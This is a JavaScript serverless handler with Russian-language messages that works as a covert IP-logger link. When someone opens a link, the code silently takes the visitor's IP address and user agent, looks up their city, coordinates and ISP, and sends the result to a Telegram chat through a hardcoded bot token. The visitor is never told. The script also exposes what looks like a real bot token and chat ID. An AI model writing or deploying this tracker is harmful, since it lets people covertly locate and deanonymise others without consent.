export default async function handler(req, res) {
  const ip = req.headers["x-forwarded-for"]?.split(',')[0] || req.socket.remoteAddress;
  const ua = req.headers["user-agent"] || "N/A";
  const slug = req.query.slug || "неизвестно";
  
  let geo = {};
  try {
    const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=country,city,lat,lon,org`);
    geo = await geoRes.json();
  } catch (_) {
    geo = {
      country_name: "Не удалось получить данные",
      city: "Не удалось получить данные",
      latitude: "Не удалось получить данные",
      longitude: "Не удалось получить данные",
      org: "Не удалось получить данные"
    };
  }

  const message = `
🔗 Ссылка: ${slug}
🌍 IP: \`${ip}\`
📍 Страна: \`${geo.country_name || "?"}\`
🏙️ Город: \`${geo.city || "?"}\`
🧭 Координаты: \`${geo.latitude || "?"}\`, \`${geo.longitude || "?"}\`
🌐 Провайдер: \`${geo.org || "?"}\`
🕰️ Локальное время: \`${new Date().toLocaleString()}\`
💻 Платформа: \`${ua.includes("Windows") ? "Windows" : ua.includes("Android") ? "Android" : "Другая"}\`
🧾 UA: \`${ua}\`
  `.trim();

  const token = "7329999473:AAEglilZMhtE6Iyr_uhLLRlI-32cIROEmNY";
  const chatId = "2079893058";

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" }),
  });

  res.status(200).json({ ok: true });
}
